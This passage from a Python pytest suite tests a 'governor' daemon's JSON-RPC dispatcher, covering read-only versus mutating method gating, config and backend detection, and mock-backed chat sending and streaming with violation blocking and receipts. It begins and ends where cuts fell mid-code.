            if "error" in resp:
                assert resp["error"]["code"] != METHOD_NOT_FOUND, (
                    f"{method} returned method-not-found"
                )


# =============================================================================
# Method classification (read_only vs mutating)
# =============================================================================

class TestMethodClassification:
    """Verify every RPC method is classified and the mutating set is explicit."""

    EXPECTED_MUTATING = {
        "sessions.create",
        "sessions.delete",
        "intent.compile",
        "commit.fix",
        "commit.revise",
        "commit.proceed",
        "scope.escalate",
        "stability.audit",
        "lanes.route",
        "chain.evaluate",
        "chain.preflight",
        "chain.record",
        "chain.reset",
        "chat.send",
        "chat.stream",
    }

    def test_all_methods_have_flags(self, dispatcher_and_state):
        d, _ = dispatcher_and_state
        info = d.get_method_info()
        all_methods = set(d._handlers) | set(d._streaming_handlers)
        for method in all_methods:
            assert method in info, f"{method} has no classification flag"

    def test_mutating_set_matches(self, dispatcher_and_state):
        d, _ = dispatcher_and_state
        actual_mutating = {m for m, flag in d.get_method_info().items() if flag == "mutating"}
        assert actual_mutating == self.EXPECTED_MUTATING

    def test_read_only_methods_not_mutating(self, dispatcher_and_state):
        d, _ = dispatcher_and_state
        for method in ["governor.hello", "governor.now", "sessions.list",
                       "receipts.list", "operator.snapshot", "trace.tail",
                       "policy.evaluate", "policy.info", "policy.capabilities",
                       "chain.status", "chain.rules"]:
            assert not d.is_mutating(method), f"{method} should be read_only"

    def test_mutating_methods_are_mutating(self, dispatcher_and_state):
        d, _ = dispatcher_and_state
        for method in self.EXPECTED_MUTATING:
            assert d.is_mutating(method), f"{method} should be mutating"

    def test_unknown_method_not_mutating(self, dispatcher_and_state):
        d, _ = dispatcher_and_state
        assert not d.is_mutating("nonexistent.method")


# =============================================================================
# governor.methods RPC handler
# =============================================================================


class TestGovernorMethods:
    """Test the governor.methods introspection endpoint."""

    @pytest.mark.asyncio
    async def test_returns_methods_list(self, dispatcher_and_state):
        d, _ = dispatcher_and_state
        resp = await roundtrip(d, "governor.methods")
        result = resp["result"]
        assert "methods" in result
        assert "count" in result
        assert isinstance(result["methods"], list)
        assert result["count"] == len(result["methods"])

    @pytest.mark.asyncio
    async def test_method_entries_have_required_keys(self, dispatcher_and_state):
        d, _ = dispatcher_and_state
        resp = await roundtrip(d, "governor.methods")
        for entry in resp["result"]["methods"]:
            assert "method" in entry
            assert "classification" in entry
            assert entry["classification"] in ("read_only", "mutating")

    @pytest.mark.asyncio
    async def test_spot_check_classifications(self, dispatcher_and_state):
        d, _ = dispatcher_and_state
        resp = await roundtrip(d, "governor.methods")
        by_name = {e["method"]: e["classification"] for e in resp["result"]["methods"]}
        assert by_name["governor.hello"] == "read_only"
        assert by_name["chat.send"] == "mutating"
        assert by_name["receipts.list"] == "read_only"
        assert by_name["commit.fix"] == "mutating"

    @pytest.mark.asyncio
    async def test_methods_sorted_by_name(self, dispatcher_and_state):
        d, _ = dispatcher_and_state
        resp = await roundtrip(d, "governor.methods")
        names = [e["method"] for e in resp["result"]["methods"]]
        assert names == sorted(names)

    @pytest.mark.asyncio
    async def test_count_matches_registered(self, dispatcher_and_state):
        d, _ = dispatcher_and_state
        resp = await roundtrip(d, "governor.methods")
        total_registered = len(d._handlers) + len(d._streaming_handlers)
        assert resp["result"]["count"] == total_registered


# =============================================================================
# Response contracts (operator.snapshot + trace.tail)
# =============================================================================


class TestResponseContracts:
    """Verify response shape contracts: caps, limits, truncated flags."""

    @pytest.mark.asyncio
    async def test_snapshot_has_limits_dict(self, dispatcher_and_state):
        d, _ = dispatcher_and_state
        resp = await roundtrip(d, "operator.snapshot")
        result = resp["result"]
        assert "limits" in result
        assert "suggestions" in result["limits"]
        assert "receipt_items" in result["limits"]
        assert isinstance(result["limits"]["suggestions"], int)
        assert isinstance(result["limits"]["receipt_items"], int)

    @pytest.mark.asyncio
    async def test_snapshot_limits_match_constants(self, dispatcher_and_state):
        d, _ = dispatcher_and_state
        resp = await roundtrip(d, "operator.snapshot")
        limits = resp["result"]["limits"]
        assert limits["suggestions"] == 5
        assert limits["receipt_items"] == 5

    @pytest.mark.asyncio
    async def test_trace_tail_returns_limit_and_max(self, dispatcher_and_state):
        d, _ = dispatcher_and_state
        resp = await roundtrip(d, "trace.tail")
        result = resp["result"]
        assert "limit" in result
        assert "max_limit" in result
        assert "truncated" in result
        assert result["max_limit"] == 100

    @pytest.mark.asyncio
    async def test_trace_tail_default_limit_is_20(self, dispatcher_and_state):
        d, _ = dispatcher_and_state
        resp = await roundtrip(d, "trace.tail")
        assert resp["result"]["limit"] == 20

    @pytest.mark.asyncio
    async def test_trace_tail_clamps_to_max(self, dispatcher_and_state):
        d, _ = dispatcher_and_state
        resp = await roundtrip(d, "trace.tail", {"limit": 500})
        assert resp["result"]["limit"] == 100

    @pytest.mark.asyncio
    async def test_trace_tail_clamps_minimum_to_1(self, dispatcher_and_state):
        d, _ = dispatcher_and_state
        resp = await roundtrip(d, "trace.tail", {"limit": 0})
        assert resp["result"]["limit"] == 1


# =============================================================================
# Mutating gate (daemon-side enforcement)
# =============================================================================


class TestMutatingGate:
    """Verify Dispatcher blocks mutating methods when configured."""

    @pytest.mark.asyncio
    async def test_mutating_allowed_by_default(self, state):
        d = Dispatcher(allow_mutating=True)
        register_handlers(d, state)
        resp = await roundtrip(d, "sessions.create", {"title": "test"})
        # Should succeed (no error key)
        assert "result" in resp

    @pytest.mark.asyncio
    async def test_mutating_blocked_when_disallowed(self, state):
        d = Dispatcher(allow_mutating=False)
        register_handlers(d, state)
        resp = await roundtrip(d, "sessions.create", {"title": "test"})
        assert "error" in resp
        assert resp["error"]["code"] == AUTH_ERROR
        assert "blocked" in resp["error"]["message"].lower()

    @pytest.mark.asyncio
    async def test_read_only_always_allowed(self, state):
        d = Dispatcher(allow_mutating=False)
        register_handlers(d, state)
        resp = await roundtrip(d, "governor.hello")
        assert "result" in resp
        assert "error" not in resp

    @pytest.mark.asyncio
    async def test_mutating_gate_applies_to_streaming(self, state):
        d = Dispatcher(allow_mutating=False)
        register_handlers(d, state)
        resp = await roundtrip(d, "chat.stream", {"messages": [{"role": "user", "content": "hi"}]})
        assert "error" in resp
        assert resp["error"]["code"] == AUTH_ERROR


# =============================================================================
# Integration: framing + dispatcher
# =============================================================================


class TestEndToEnd:

    @pytest.mark.asyncio
    async def test_frame_dispatch_roundtrip(self, dispatcher_and_state):
        """Frame a request, read it, dispatch, write response, read response."""
        d, _ = dispatcher_and_state

        # Create framed request
        req = rpc_request("governor.hello")
        data = frame(req)

        # Read
        reader = asyncio.StreamReader()
        reader.feed_data(data)
        msg = await read_message(reader)

        # Dispatch
        resp = await d.dispatch(msg)
        assert resp["result"]["protocol_version"] == PROTOCOL_VERSION

    @pytest.mark.asyncio
    async def test_multiple_requests(self, dispatcher_and_state):
        """Multiple sequential requests work correctly."""
        d, _ = dispatcher_and_state

        r1 = await roundtrip(d, "governor.hello", id=1)
        r2 = await roundtrip(d, "governor.now", id=2)
        r3 = await roundtrip(d, "sessions.list", id=3)

        assert r1["id"] == 1
        assert r2["id"] == 2
        assert r3["id"] == 3
        assert "protocol_version" in r1["result"]
        assert "pill" in r2["result"]
        assert isinstance(r3["result"], list)


# =============================================================================
# Config file loading
# =============================================================================


class TestLoadDaemonConfig:

    def test_no_config_file(self, tmp_path):
        result = load_daemon_config(tmp_path)
        assert result == {}

    def test_basic_config(self, tmp_path):
        conf = tmp_path / "daemon.conf"
        conf.write_text("[backend]\ntype = anthropic\nmodel = sonnet\n")
        result = load_daemon_config(tmp_path)
        assert result["backend.type"] == "anthropic"
        assert result["backend.model"] == "sonnet"

    def test_nested_sections(self, tmp_path):
        conf = tmp_path / "daemon.conf"
        conf.write_text(
            "[backend.anthropic]\n"
            "api_key = sk-test\n"
            "[backend.ollama]\n"
            "url = http://myhost:11434\n"
            "[daemon]\n"
            "mode = fiction\n"
        )
        result = load_daemon_config(tmp_path)
        assert result["backend.anthropic.api_key"] == "sk-test"
        assert result["backend.ollama.url"] == "http://myhost:11434"
        assert result["daemon.mode"] == "fiction"

    def test_malformed_config(self, tmp_path):
        conf = tmp_path / "daemon.conf"
        conf.write_text("this is not valid ini\n\x00\x01")
        result = load_daemon_config(tmp_path)
        # Should not crash, just return partial or empty
        assert isinstance(result, dict)


# =============================================================================
# Backend auto-detection
# =============================================================================


class TestDetectBackend:

    def test_explicit_backend_type_env(self):
        with patch.dict(os.environ, {"BACKEND_TYPE": "anthropic",
                                     "ANTHROPIC_API_KEY": "sk-x"}):
            bt, kwargs = detect_backend()
            assert bt == "anthropic"
            assert kwargs["api_key"] == "sk-x"

    def test_explicit_ollama_type(self):
        with patch.dict(os.environ, {"BACKEND_TYPE": "ollama"}, clear=False):
            bt, kwargs = detect_backend()
            assert bt == "ollama"
            assert "host" in kwargs

    def test_config_file_fallback(self):
        config = {"backend.type": "codex"}
        env = os.environ.copy()
        env.pop("BACKEND_TYPE", None)
        env.pop("ANTHROPIC_API_KEY", None)
        with patch.dict(os.environ, env, clear=True):
            bt, kwargs = detect_backend(config)
            assert bt == "codex"

    def test_auto_detect_anthropic_key(self):
        env = os.environ.copy()
        env.pop("BACKEND_TYPE", None)
        env["ANTHROPIC_API_KEY"] = "sk-ant-test"
        with patch.dict(os.environ, env, clear=True):
            bt, kwargs = detect_backend()
            assert bt == "anthropic"
            assert kwargs["api_key"] == "sk-ant-test"

    def test_auto_detect_claude_cli(self):
        env = os.environ.copy()
        env.pop("BACKEND_TYPE", None)
        env.pop("ANTHROPIC_API_KEY", None)
        with patch.dict(os.environ, env, clear=True), \
             patch("shutil.which", side_effect=lambda x: "/usr/bin/claude" if x == "claude" else None):
            bt, kwargs = detect_backend()
            assert bt == "claude-code"
            assert kwargs["claude_path"] == "claude"

    def test_auto_detect_codex_cli(self):
        env = os.environ.copy()
        env.pop("BACKEND_TYPE", None)
        env.pop("ANTHROPIC_API_KEY", None)
        with patch.dict(os.environ, env, clear=True), \
             patch("shutil.which", side_effect=lambda x: "/usr/bin/codex" if x == "codex" else None):
            bt, kwargs = detect_backend()
            assert bt == "codex"

    def test_fallback_to_ollama(self):
        env = os.environ.copy()
        env.pop("BACKEND_TYPE", None)
        env.pop("ANTHROPIC_API_KEY", None)
        with patch.dict(os.environ, env, clear=True), \
             patch("shutil.which", return_value=None):
            bt, kwargs = detect_backend()
            assert bt == "ollama"

    def test_env_overrides_config(self):
        config = {"backend.type": "ollama"}
        with patch.dict(os.environ, {"BACKEND_TYPE": "anthropic",
                                     "ANTHROPIC_API_KEY": "key"}):
            bt, kwargs = detect_backend(config)
            assert bt == "anthropic"

    def test_default_model_from_env(self):
        with patch.dict(os.environ, {"BACKEND_TYPE": "ollama",
                                     "GOVERNOR_MODEL": "llama3"}):
            bt, kwargs = detect_backend()
            assert kwargs["default_model"] == "llama3"

    def test_default_model_from_config(self):
        config = {"backend.type": "ollama", "backend.model": "mistral"}
        env = os.environ.copy()
        env.pop("BACKEND_TYPE", None)
        env.pop("GOVERNOR_MODEL", None)
        env.pop("ANTHROPIC_API_KEY", None)
        with patch.dict(os.environ, env, clear=True), \
             patch("shutil.which", return_value=None):
            bt, kwargs = detect_backend(config)
            assert kwargs.get("default_model") == "mistral"

    def test_ollama_custom_host(self):
        with patch.dict(os.environ, {"BACKEND_TYPE": "ollama",
                                     "OLLAMA_HOST": "http://gpu:11434"}):
            bt, kwargs = detect_backend()
            assert kwargs["host"] == "http://gpu:11434"


# =============================================================================
# DaemonState: ChatBridge + context manager
# =============================================================================


class TestDaemonStateChatBridge:

    def test_chat_bridge_none_on_failure(self, state):
        """When backend creation fails, chat_bridge returns None."""
        with patch("governor.daemon.detect_backend",
                   return_value=("anthropic", {"api_key": ""})):
            # Anthropic backend with empty key raises ValueError
            bridge = state.chat_bridge
            assert bridge is None

    def test_backend_type_lazy(self, state):
        """backend_type triggers detection on first access."""
        with patch("governor.daemon.detect_backend",
                   return_value=("ollama", {"host": "http://localhost:11434"})):
            assert state.backend_type == "ollama"

    def test_default_model_empty(self, state):
        assert state.default_model == ""

    def test_context_manager_lazy(self, state):
        assert state._context_manager is None
        cm = state.context_manager
        assert cm is not None
        assert state.context_manager is cm

    def test_daemon_config_lazy(self, state):
        assert state._config is None
        cfg = state.daemon_config
        assert isinstance(cfg, dict)
        assert state.daemon_config is cfg


# =============================================================================
# Handler: governor.hello — updated capabilities
# =============================================================================


class TestGovernorHelloChat:

    @pytest.mark.asyncio
    async def test_hello_includes_chat_capability(self, dispatcher_and_state):
        d, _ = dispatcher_and_state
        resp = await roundtrip(d, "governor.hello")
        caps = resp["result"]["capabilities"]
        assert "chat" in caps
        assert "streaming" in caps
        assert "backend" in caps
        assert isinstance(caps["backend"], dict)
        assert "type" in caps["backend"]
        assert "connected" in caps["backend"]

    @pytest.mark.asyncio
    async def test_hello_chat_false_when_no_backend(self, dispatcher_and_state):
        """Chat capability is False when no backend can be created."""
        d, state = dispatcher_and_state
        # Force no backend
        state._chat_bridge = None
        state._backend_type = "none"
        with patch.object(DaemonState, "chat_bridge", new_callable=lambda: property(lambda self: None)):
            d2 = Dispatcher()
            register_handlers(d2, state)
            resp = await roundtrip(d2, "governor.hello")
            caps = resp["result"]["capabilities"]
            assert caps["chat"] is False


# =============================================================================
# Handler: chat.backend
# =============================================================================


class TestChatBackend:

    @pytest.mark.asyncio
    async def test_backend_returns_type(self, dispatcher_and_state):
        d, state = dispatcher_and_state
        resp = await roundtrip(d, "chat.backend")
        result = resp["result"]
        assert "type" in result
        assert "connected" in result

    @pytest.mark.asyncio
    async def test_backend_no_model_by_default(self, dispatcher_and_state):
        d, _ = dispatcher_and_state
        resp = await roundtrip(d, "chat.backend")
        # No default_model set in test fixture
        assert "model" not in resp["result"]


# =============================================================================
# Handler: chat.models
# =============================================================================


class TestChatModels:

    @pytest.mark.asyncio
    async def test_models_empty_when_no_backend(self, dispatcher_and_state):
        d, state = dispatcher_and_state
        # No backend configured in test environment
        resp = await roundtrip(d, "chat.models")
        result = resp["result"]
        assert "models" in result
        assert isinstance(result["models"], list)


# =============================================================================
# Handler: chat.send — with mock backend
# =============================================================================


class MockChatBackend:
    """Minimal mock backend for testing chat handlers."""

    def __init__(self, response_content: str = "Hello from mock"):
        self.response_content = response_content
        self.last_messages = None
        self.last_model = None

    async def chat(self, messages, model, **kwargs):
        from governor.chat_bridge import ChatResponse
        self.last_messages = messages
        self.last_model = model
        return ChatResponse(
            content=self.response_content,
            model=model or "mock-model",
            usage={"prompt_tokens": 10, "completion_tokens": 20, "total_tokens": 30},
        )

    async def stream(self, messages, model, **kwargs):
        from governor.chat_bridge import ChatChunk
        self.last_messages = messages
        self.last_model = model
        # Yield content in chunks
        words = self.response_content.split()
        for word in words:
            yield ChatChunk(content=word + " ")
        yield ChatChunk(content="", finish_reason="stop")

    async def list_models(self):
        return [{"id": "mock-model", "owned_by": "test"}]


@pytest.fixture
def state_with_mock_backend(tmp_gov_dir):
    """DaemonState with a mock chat backend pre-wired."""
    state = DaemonState(tmp_gov_dir, mode="general")
    mock_backend = MockChatBackend("Hello from the governed LLM")
    from governor.chat_bridge import ChatBridge
    from governor.context_manager import GovernorContextManager
    ctx_mgr = GovernorContextManager(tmp_gov_dir)
    state._chat_bridge = ChatBridge(
        backend=mock_backend,
        context_manager=ctx_mgr,
        show_ok_footer=True,
    )
    state._backend_type = "mock"
    state._backend_kwargs = {}
    state._context_manager = ctx_mgr
    return state


@pytest.fixture
def dispatcher_with_chat(state_with_mock_backend):
    d = Dispatcher()
    register_handlers(d, state_with_mock_backend)
    return d, state_with_mock_backend


class TestChatSend:

    @pytest.mark.asyncio
    async def test_send_basic(self, dispatcher_with_chat):
        d, state = dispatcher_with_chat
        resp = await roundtrip(d, "chat.send", {
            "messages": [{"role": "user", "content": "Hi"}],
        })
        result = resp["result"]
        assert "content" in result
        assert result["content"] == "Hello from the governed LLM"
        assert result["model"] == "mock-model"
        assert "usage" in result
        assert "violations" in result
        assert result["pending"] is None

    @pytest.mark.asyncio
    async def test_send_with_model(self, dispatcher_with_chat):
        d, _ = dispatcher_with_chat
        resp = await roundtrip(d, "chat.send", {
            "messages": [{"role": "user", "content": "Hi"}],
            "model": "custom-model",
        })
        assert resp["result"]["model"] == "custom-model"

    @pytest.mark.asyncio
    async def test_send_missing_messages(self, dispatcher_with_chat):
        d, _ = dispatcher_with_chat
        resp = await roundtrip(d, "chat.send", {})
        assert resp["error"]["code"] == GOVERNOR_ERROR

    @pytest.mark.asyncio
    async def test_send_empty_messages(self, dispatcher_with_chat):
        d, _ = dispatcher_with_chat
        resp = await roundtrip(d, "chat.send", {"messages": []})
        assert resp["error"]["code"] == GOVERNOR_ERROR

    @pytest.mark.asyncio
    async def test_send_no_backend(self, tmp_gov_dir):
        """chat.send fails gracefully when no backend is configured."""
        state = DaemonState(tmp_gov_dir, mode="general")
        # Force chat_bridge to None by setting a failed state
        state._chat_bridge = None
        state._backend_type = "none"

        # Prevent lazy init from auto-detecting a real backend
        with patch.object(DaemonState, "chat_bridge",
                          new_callable=lambda: property(lambda self: None)):
            d = Dispatcher()
            register_handlers(d, state)
            resp = await roundtrip(d, "chat.send", {
                "messages": [{"role": "user", "content": "Hi"}],
            })
            assert resp["error"]["code"] == GOVERNOR_ERROR
            assert "No chat backend" in resp["error"]["message"]

    @pytest.mark.asyncio
    async def test_send_footer_included(self, dispatcher_with_chat):
        """Non-blocking response includes governor footer."""
        d, _ = dispatcher_with_chat
        resp = await roundtrip(d, "chat.send", {
            "messages": [{"role": "user", "content": "test"}],
        })
        result = resp["result"]
        # With no anchors, footer may be None or OK depending on checked_anchors
        assert "footer" in result

    @pytest.mark.asyncio
    async def test_send_multi_message(self, dispatcher_with_chat):
        d, _ = dispatcher_with_chat
        resp = await roundtrip(d, "chat.send", {
            "messages": [
                {"role": "system", "content": "You are helpful"},
                {"role": "user", "content": "Hi"},
                {"role": "assistant", "content": "Hello"},
                {"role": "user", "content": "How are you?"},
            ],
        })
        result = resp["result"]
        assert "content" in result

    @pytest.mark.asyncio
    async def test_send_with_context_id(self, dispatcher_with_chat):
        d, _ = dispatcher_with_chat
        resp = await roundtrip(d, "chat.send", {
            "messages": [{"role": "user", "content": "Hi"}],
            "context_id": "test-ctx",
        })
        result = resp["result"]
        assert result["pending"] is None

    @pytest.mark.asyncio
    async def test_send_emits_receipt(self, dispatcher_with_chat):
        d, state = dispatcher_with_chat
        resp = await roundtrip(d, "chat.send", {
            "messages": [{"role": "user", "content": "test"}],
        })
        assert resp["result"]["content"]  # Got a response
        # Check receipt was emitted
        receipts = state.receipt_system.query(gate="chat_bridge")
        assert len(receipts) >= 1
        assert receipts[0].verdict == "pass"


# =============================================================================
# Handler: chat.stream — streaming with notifications
# =============================================================================


class TestChatStream:

    @pytest.mark.asyncio
    async def test_stream_dispatches(self, dispatcher_with_chat):
        """chat.stream handler is found and executes."""
        d, state = dispatcher_with_chat
        notifications: list[dict] = []

        async def mock_notify(method: str, params: dict) -> None:
            notifications.append({"method": method, "params": params})

        # Call the streaming handler directly through the dispatcher
        handler = d._streaming_handlers["chat.stream"]
        result = await handler({
            "messages": [{"role": "user", "content": "Hello"}],
        }, mock_notify)

        assert "content" in result
        assert result["content"] == "Hello from the governed LLM "
        # Should have received delta notifications
        assert len(notifications) > 0
        for n in notifications:
            assert n["method"] == "chat.delta"
            assert "content" in n["params"]

    @pytest.mark.asyncio
    async def test_stream_final_response(self, dispatcher_with_chat):
        d, _ = dispatcher_with_chat
        notifications: list[dict] = []

        async def mock_notify(method: str, params: dict) -> None:
            notifications.append({"method": method, "params": params})

        handler = d._streaming_handlers["chat.stream"]
        result = await handler({
            "messages": [{"role": "user", "content": "Hi"}],
        }, mock_notify)

        # Final result has all required fields
        assert "content" in result
        assert "model" in result
        assert "violations" in result
        assert "footer" in result
        assert "pending" in result

    @pytest.mark.asyncio
    async def test_stream_no_backend(self, tmp_gov_dir):
        state = DaemonState(tmp_gov_dir, mode="general")
        with patch.object(DaemonState, "chat_bridge",
                          new_callable=lambda: property(lambda self: None)):
            d = Dispatcher()
            register_handlers(d, state)
            req = rpc_request("chat.stream", {
                "messages": [{"role": "user", "content": "Hi"}],
            })
            resp = await d.dispatch(req)
            assert resp["error"]["code"] == GOVERNOR_ERROR

    @pytest.mark.asyncio
    async def test_stream_emits_receipt(self, dispatcher_with_chat):
        d, state = dispatcher_with_chat
        handler = d._streaming_handlers["chat.stream"]

        async def noop_notify(method: str, params: dict) -> None:
            pass

        await handler({
            "messages": [{"role": "user", "content": "test"}],
        }, noop_notify)

        receipts = state.receipt_system.query(gate="chat_bridge")
        assert len(receipts) >= 1

    @pytest.mark.asyncio
    async def test_stream_missing_messages(self, dispatcher_with_chat):
        d, _ = dispatcher_with_chat

        async def noop_notify(method: str, params: dict) -> None:
            pass

        handler = d._streaming_handlers["chat.stream"]
        with pytest.raises(ValueError, match="Missing required param"):
            await handler({}, noop_notify)

    @pytest.mark.asyncio
    async def test_stream_delta_content_matches(self, dispatcher_with_chat):
        """All delta content concatenated equals the final content."""
        d, _ = dispatcher_with_chat
        chunks: list[str] = []

        async def collect_notify(method: str, params: dict) -> None:
            if method == "chat.delta":
                chunks.append(params["content"])

        handler = d._streaming_handlers["chat.stream"]
        result = await handler({
            "messages": [{"role": "user", "content": "Hi"}],
        }, collect_notify)

        streamed = "".join(chunks)
        assert streamed == result["content"]


# =============================================================================
# Streaming dispatch integration (writer passthrough)
# =============================================================================


class TestStreamingDispatch:

    @pytest.mark.asyncio
    async def test_dispatch_passes_writer_to_streaming_handler(self):
        """Verify dispatch plumbs the writer into streaming handlers."""
        d = Dispatcher()
        received_notify = []

        async def streaming_echo(params: dict, notify) -> dict:
            await notify("test.delta", {"chunk": "A"})
            await notify("test.delta", {"chunk": "B"})
            return {"result": "done"}

        d.register_streaming("test.echo", streaming_echo)

        # Create a mock writer
        written: list[bytes] = []
        writer = MagicMock()
        writer.write = lambda data: written.append(data)

        async def mock_drain():
            pass
        writer.drain = mock_drain

        req = {"jsonrpc": "2.0", "method": "test.echo", "id": 1, "params": {}}
        resp = await d.dispatch(req, writer=writer)

        assert resp["result"] == {"result": "done"}
        # Two notifications should have been written
        assert len(written) == 2

        # Parse the written notifications
        for data in written:
            text = data.decode("utf-8")
            assert "Content-Length:" in text
            _, _, body = text.partition("\r\n\r\n")
            msg = json.loads(body)
            assert msg["method"] == "test.delta"

    @pytest.mark.asyncio
    async def test_streaming_handler_without_writer(self):
        """When no writer, notify is a no-op (doesn't crash)."""
        d = Dispatcher()

        async def streaming_handler(params, notify):
            await notify("delta", {"x": 1})
            return {"ok": True}

        d.register_streaming("test.stream", streaming_handler)
        req = {"jsonrpc": "2.0", "method": "test.stream", "id": 1, "params": {}}
        resp = await d.dispatch(req, writer=None)
        assert resp["result"] == {"ok": True}

    @pytest.mark.asyncio
    async def test_streaming_handler_error(self):
        d = Dispatcher()

        async def bad_stream(params, notify):
            raise RuntimeError("stream failed")

        d.register_streaming("test.fail", bad_stream)
        req = {"jsonrpc": "2.0", "method": "test.fail", "id": 1, "params": {}}
        resp = await d.dispatch(req)
        assert resp["error"]["code"] == GOVERNOR_ERROR
        assert "stream failed" in resp["error"]["message"]


# =============================================================================
# _emit_chat_receipt helper
# =============================================================================


class TestEmitChatReceipt:

    def test_emit_pass(self, state_with_mock_backend):
        state = state_with_mock_backend
        _emit_chat_receipt(state, "pass", "Hello world", "run_1")
        receipts = state.receipt_system.query(gate="chat_bridge", verdict="pass")
        assert len(receipts) == 1

    def test_emit_block(self, state_with_mock_backend):
        state = state_with_mock_backend
        _emit_chat_receipt(state, "block", "Bad content", "run_2")
        receipts = state.receipt_system.query(gate="chat_bridge", verdict="block")
        assert len(receipts) == 1

    def test_emit_receipt_failure_silent(self, state):
        """Receipt emission failure should not propagate."""
        # state has no chat bridge, but _emit_chat_receipt should not crash
        _emit_chat_receipt(state, "pass", "content", "run_3")
        # No exception raised — that's the test


# =============================================================================
# Chat with blocking violations
# =============================================================================


class TestChatBlockingViolation:

    @pytest.mark.asyncio
    async def test_send_with_violation_returns_pending(self, tmp_gov_dir):
        """When governor check finds REJECT violations, pending is returned."""
        state = DaemonState(tmp_gov_dir, mode="general")
        mock_backend = MockChatBackend("This violates everything")

        from governor.chat_bridge import ChatBridge, GovernorCheckResult, ViolationPendingResponse
        from governor.context_manager import GovernorContextManager

        ctx_mgr = GovernorContextManager(tmp_gov_dir)
        state._chat_bridge = ChatBridge(
            backend=mock_backend,
            context_manager=ctx_mgr,
            show_ok_footer=True,
        )
        state._backend_type = "mock"
        state._backend_kwargs = {}
        state._context_manager = ctx_mgr

        d = Dispatcher()
        register_handlers(d, state)

        # Mock check_response_blocking to return a ViolationPendingResponse
        violation_resp = ViolationPendingResponse(
            blocked_response="This violates everything",
            violations=[{"anchor_id": "a1", "severity": "reject", "message": "Bad"}],
            choices=["fix", "revise", "proceed"],
            prompt="Violation detected",
            run_id="test_run",
            pending_id="pending_1",
        )

        with patch("governor.chat_bridge.GovernorHooks.check_response_blocking",
                    return_value=violation_resp):
            resp = await roundtrip(d, "chat.send", {
                "messages": [{"role": "user", "content": "Do bad thing"}],
            })
            result = resp["result"]
            assert result["pending"] is not None
            assert result["pending"]["blocked_response"] == "This violates everything"
            assert len(result["violations"]) == 1

    @pytest.mark.asyncio
    async def test_stream_with_violation_returns_pending(self, tmp_gov_dir):
        state = DaemonState(tmp_gov_dir, mode="general")
        mock_backend = MockChatBackend("Violating content")

        from governor.chat_bridge import ChatBridge, ViolationPendingResponse
        from governor.context_manager import GovernorContextManager

        ctx_mgr = GovernorContextManager(tmp_gov_dir)
        state._chat_bridge = ChatBridge(
            backend=mock_backend,
            context_manager=ctx_mgr,
        )
        state._backend_type = "mock"
        state._backend_kwargs = {}
        state._context_manager = ctx_mgr

        d = Dispatcher()
        register_handlers(d, state)

        violation_resp = ViolationPendingResponse(
            blocked_response="Violating content",
            violations=[{"anchor_id": "a1", "severity": "reject"}],
            choices=["fix"],
            prompt="Fix it",
            run_id="run_x",
        )

        async def noop_notify(method, params):
            pass

        with patch("governor.chat_bridge.GovernorHooks.check_response_blocking",
                    return_value=violation_resp):
            handler = d._streaming_handlers["chat.stream"]
            result = await handler({
                "messages": [{"role": "user", "content": "test"}],
            }, noop_notify)
            assert result["pending"] is not None


# =============================================================================
# Chat with mock backend: models listing
# =============================================================================


class TestChatModelsWithBackend:

    @pytest.mark.asyncio
    async def test_models_from_mock_backend(self, dispatcher_with_chat):
        d, _ = dispatcher_with_chat
        resp = await roundtrip(d, "chat.models")
        models = resp["result"]["models"]
        assert len(models) == 1
        assert models[0]["id"] == "mock-model"

    @pytest.mark.asyncio
    async def test_backend_info_with_mock(self, dispatcher_with_chat):
        d, _ = dispatcher_with_chat
        resp = await roundtrip(d, "chat.backend")
        result = resp["result"]
        assert result["type"] == "mock"
        assert result["connected"] is True


# =============================================================================
# Pending violation pre-check in chat.send / chat.stream
# =============================================================================


class TestChatPendingPreCheck:
    """When a pending violation exists, chat.send/chat.stream must not generate."""

    @pytest.fixture
    def state_with_pending(self, tmp_gov_dir):
        """DaemonState with a mock backend AND a pre-existing pending violation."""
        import json as _json
        from governor.violation_resolver import PendingViolation, ResolutionStatus

        state = DaemonState(tmp_gov_dir, mode="general")

        # Wire up mock backend
        mock_backend = MockChatBackend("Should NOT appear")
        from governor.chat_bridge import ChatBridge
        from governor.context_manager import GovernorContextManager

        ctx_mgr = GovernorContextManager(tmp_gov_dir)
        state._chat_bridge = ChatBridge(
            backend=mock_backend,
            context_manager=ctx_mgr,
            show_ok_footer=True,
        )
        state._backend_type = "mock"
        state._backend_kwargs = {}
        state._context_manager = ctx_mgr

        # Write a pending violation to disk
        pending = PendingViolation(
            id="pending_test_1",
            context_id="default",
            run_id="run_abc",
            violations=[
                {"anchor_id": "anchor-1", "severity": "reject",
                 "description": "Tone violation"}
            ],
            blocked_response="The blocked text",
            timestamp="2025-01-01T00:00:00Z",
            mode="general",
            status=ResolutionStatus.PENDING,
        )
        (tmp_gov_dir / "pending_violations.json").write_text(
            _json.dumps(pending.to_dict())
        )

        return state

    @pytest.fixture
    def dispatcher_with_pending(self, state_with_pending):
        d = Dispatcher()
        register_handlers(d, state_with_pending)
        return d, state_with_pending

    @pytest.mark.asyncio
    async def test_send_returns_pending_without_generating(
        self, dispatcher_with_pending
    ):
        """chat.send must return pending violation instead of calling backend."""
        d, state = dispatcher_with_pending
        resp = await roundtrip(d, "chat.send", {
            "messages": [{"role": "user", "content": "Hello"}],
        })
        result = resp["result"]
        # Should return pending, NOT the mock backend response
        assert result["pending"] is not None
        assert result["pending"]["id"] == "pending_test_1"
        assert result["content"] == ""
        assert len(result["violations"]) == 1

    @pytest.mark.asyncio
    async def test_stream_returns_pending_without_generating(
        self, dispatcher_with_pending
    ):
        """chat.stream must return pending violation without streaming."""
        d, _ = dispatcher_with_pending
        notifications: list[dict] = []

        async def collect(method: str, params: dict) -> None:
            notifications.append({"method": method, "params": params})

        handler = d._streaming_handlers["chat.stream"]
        result = await handler(
            {"messages": [{"role": "user", "content": "Hello"}]},
            collect,
        )
        # Should return pending, not stream content
        assert result["pending"] is not None
        assert result["content"] == ""
        # No delta notifications sent
        assert len(notifications) == 0

    @pytest.mark.asyncio
    async def test_send_resolution_command_resolves(
        self, dispatcher_with_pending
    ):
        """When pending exists and user sends 'proceed', resolve the violation."""
        d, state = dispatcher_with_pending
        resp = await roundtrip(d, "chat.send", {
            "messages": [{"role": "user", "content": "proceed"}],
        })
        result = resp["result"]
        # Should be resolved — no more pending
        assert result["pending"] is None
        assert "Governor" in result["content"] or "Proceed" in result["content"].lower() or result["content"]

    @pytest.mark.asyncio
    async def test_stream_resolution_command_resolves(
        self, dispatcher_with_pending
    ):
        """When pending exists and user sends 'revise', resolve via stream path."""
        d, _ = dispatcher_with_pending

